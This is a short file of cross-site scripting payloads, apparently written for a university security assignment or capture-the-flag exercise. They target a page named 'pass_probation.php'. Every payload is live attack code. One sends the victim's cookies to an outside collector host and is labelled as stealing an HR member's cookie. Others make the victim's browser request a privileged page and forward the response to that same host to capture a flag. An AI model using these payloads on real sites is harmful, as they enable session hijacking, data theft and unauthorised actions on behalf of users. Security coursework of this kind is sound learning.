//code for XSS

//check server
<script>
var x = new XMLHttpRequest();
x.open("POST", "https://ass2ws.free.beeceptor.com");
x.send();
</script>

//steal HR team member cookie
<script>
var x = new XMLHttpRequest();
x.open("POST", "https://ass2ws.free.beeceptor.com/cookie?"+document.cookie);
x.send();
</script>


//
<script>
var x = new XMLHttpRequest();
x.onreadystatechange=function()
{
   var x2 = new XMLHttpRequest();
   x2.open("GET", "https://ass2ws.free.beeceptor.com/response?="+x.responseText, true);
   x2.send();   
};
x.open("GET", "/pass_probation.php?user=yicguan", true);
x.send();
</script>

//full domain find flag
<script>
var x = new XMLHttpRequest();
x.onreadystatechange=function()
{
   var x2 = new XMLHttpRequest();
   x2.open("GET", "https://ass2ws.free.beeceptor.com/?="+x.responseText, true);
   x2.send();   
};
x.open("GET", "http://assignment-code-warriors.unimelb.life/pass_probation.php?user=yicguan", true);
x.send();
</script>


//other test
<script>
var x = new XMLHttpRequest();
x.onreadystatechange=function()
{
   var x2 = new XMLHttpRequest();
   x2.open("POST", "https://ass2ws.free.beeceptor.com/?="+x.responseText, true);
   x2.send();   
};
x.open("GET", "http://localhost/pass_probation.php?user=yicguan", true);
x.send();
</script>